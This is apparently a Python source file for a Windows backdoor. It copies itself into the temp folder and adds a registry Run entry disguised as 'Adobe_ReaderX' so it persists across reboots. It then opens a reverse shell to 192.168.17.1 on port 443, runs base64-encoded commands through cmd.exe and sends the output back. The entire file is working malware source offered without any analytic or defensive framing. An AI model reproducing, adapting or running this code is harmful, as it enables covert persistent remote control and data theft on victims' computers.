import sys, base64, os, socket, subprocess
from winreg import *

def autorun(tempdir, filename, run):
    #  copy executable to %temp%
    os.system("copy {0} {1}".format(filename, tempdir))

    #  queries windows registry for the autorun key value
    #  stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []

    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1

    except WindowsError as err:
        pass

    # if the autorun key adobe readerx isn't set this will  set the key
    if "Adobe ReaderX" not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%mw.exe")
            key.Close()
        except WindowsError as err:
            pass

def shell():
    # base64 encoded reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.17.1', int(443)))

    while True:
        data = s.recv(1024)
        data_decode = base64.b64decode(data)

        print(data_decode.decode('big5'))
        proc = subprocess.Popen(['cmd.exe', '/K', data_decode.decode('big5')], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        out, err = proc.communicate()

        return_data = out + err
        encoded = base64.b64encode(return_data)
        s.send(encoded)
    s.close()

def main():
    tempdir = '%TEMP%'
    filename = sys.argv[0]

    run = r"Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, filename, run)
    shell()

if __name__ == '__main__':
    main()
